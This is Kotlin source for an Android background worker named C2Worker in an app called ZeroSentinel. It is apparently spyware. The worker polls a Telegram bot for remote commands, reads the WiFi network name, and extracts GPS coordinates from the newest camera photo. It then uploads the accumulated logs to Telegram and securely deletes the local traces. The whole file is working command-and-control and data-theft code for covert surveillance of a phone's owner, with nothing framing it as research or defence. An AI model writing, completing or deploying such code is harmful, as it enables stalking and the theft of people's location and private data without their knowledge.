package com.zero.sentinel.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.zero.sentinel.ZeroSentinelApp
import com.zero.sentinel.network.CommandProcessor
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.SecureDelete
import com.zero.sentinel.utils.DeviceInfoHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class C2Worker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val repository = (appContext.applicationContext as ZeroSentinelApp).repository
    private val telegramClient = TelegramClient(appContext)
    private val commandProcessor = CommandProcessor(appContext, repository, telegramClient)

    // In a real production app, we should persist the last update ID to SharedPreferences
    // to avoid processing old messages. For now, we rely on Telegram's logic or simple memory if worker stays alive (it won't).
    // TODO: Ideally pass lastUpdateId via inputData or SharedPreferences.
    // However, getUpdates with offset=0 returns all unconfirmed updates. If we confirm them (by using offset = last_id + 1), they vanish.
    // So we need to store the last processed ID in SharedPreferences.
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d("C2Worker", "Starting C2 Cycle")

            // 1. Command Processing (Priority)
            processCommands()

            // 2. Passive Monitoring (WiFi & Camera/DCIM)
            passiveScan()

            // 3. Upload Logs (Hybrid: SQLite -> Temp File -> Upload -> Cleanup)
            uploadLogs()

            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e("C2Worker", "Error in C2 cycle", e)
            return@withContext Result.retry()
        }
    }

    private fun processCommands() {
        try {
            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
            val lastUpdateId = prefs.getLastUpdateId()
            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
            
            val updates = telegramClient.pollUpdates(nextOffset)
            val maxUpdateId = commandProcessor.processUpdates(updates)
            
            if (maxUpdateId > lastUpdateId) {
                prefs.saveLastUpdateId(maxUpdateId)
            }
        } catch (e: Exception) {
            Log.e("C2Worker", "Command processing failed", e)
        }
    }

    private suspend fun passiveScan() {
        val context = applicationContext
        
        // --- 1. WiFi SSID ---
        var ssid = "Unknown"
        val hasLocPerm = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (hasLocPerm) {
            try {
                val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                @Suppress("DEPRECATION")
                val info = wifiManager.connectionInfo
                val rawSsid = info.ssid
                if (!rawSsid.isNullOrEmpty() && rawSsid != "<unknown ssid>") {
                    ssid = rawSsid.replace("\"", "")
                }
            } catch (e: Exception) {
                Log.e("C2Worker", "WiFi Scan Failed", e)
            }
        }
        
        // --- 2. Camera/DCIM Image Scan ---
        var locationUrl = "Unknown"
        var imgDate = "Unknown"
        
        val hasStorage = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        
        if (hasStorage) {
            try {
                val projection = arrayOf(
                    android.provider.MediaStore.Images.Media.DATA,
                    android.provider.MediaStore.Images.Media.DATE_ADDED
                )
                // Filter for DCIM or Camera to be more specific (matches "Fokus di kamera taken")
                val selection = "${android.provider.MediaStore.Images.Media.DATA} LIKE ?"
                val selectionArgs = arrayOf("%DCIM%") 
                val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"

                context.contentResolver.query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    sortOrder
                )?.use { cursor ->
                    if (cursor.moveToFirst()) {
                        val pathCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATA)
                        val dateCol = cursor.getColumnIndex(android.provider.MediaStore.Images.Media.DATE_ADDED)
                        
                        if (pathCol != -1 && dateCol != -1) {
                            val path = cursor.getString(pathCol)
                            val timestamp = cursor.getLong(dateCol)
                            
                            if (path != null) {
                                imgDate = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(timestamp * 1000L))
                                
                                // Reset Location to Unknown before checking EXIF
                                locationUrl = "Unknown" 
                                try {
                                    val exif = android.media.ExifInterface(path)
                                    val latLong = FloatArray(2)
                                    if (exif.getLatLong(latLong)) {
                                        locationUrl = "https://maps.google.com/?q=${latLong[0]},${latLong[1]}"
                                    }
                                } catch (e: Exception) {
                                    // EXIF extraction failed, location remains Unknown
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                 Log.e("C2Worker", "Media Scan Failed", e)
            }
        }

        // --- 3. Log Result ---
        val logContent = "📡 [WIFI: $ssid] 📸 [IMG: $imgDate] 📍 [LOC: $locationUrl]"
        repository.insertLog(
            type = "PASSIVE",
            packageName = "System",
            content = logContent
        )
    }

    private suspend fun uploadLogs() {
        // 1. Fetch from DB
        val logs = repository.getAllLogs()
        if (logs.isEmpty()) return

        // 2. Write to Temp File
        val deviceName = DeviceInfoHelper.getSafeDeviceName()
        val timeStamp = SimpleDateFormat("yyyy-MM-dd_HH-mm", Locale.getDefault()).format(Date())
        val fileName = "logs_${deviceName}_${timeStamp}.txt"
        val file = File(applicationContext.cacheDir, fileName)

        try {
            FileWriter(file).use { writer ->
                logs.forEach { log ->
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(log.timestamp))
                    writer.append("[$date] [${log.type}] ${log.content}\n")
                }
            }

            // 3. Upload to Telegram
            val success = telegramClient.sendDocument(file)

            // 4. Cleanup (Conditional)
            if (success) {
                repository.deleteAllLogs() // Transactional delete from DB
                SecureDelete.deleteSecurely(file) // Delete temp file
                Log.i("C2Worker", "✅ Upload Success. Cleared ${logs.size} logs.")
            } else {
                Log.w("C2Worker", "⚠️ Upload Failed. Logs retained in DB.")
                SecureDelete.deleteSecurely(file) // Always delete temp file to save space
            }

        } catch (e: Exception) {
            Log.e("C2Worker", "Upload Process Error", e)
            if (file.exists()) {
                file.delete()
            }
            // Logs remain in DB for next retry
        }
    }
}
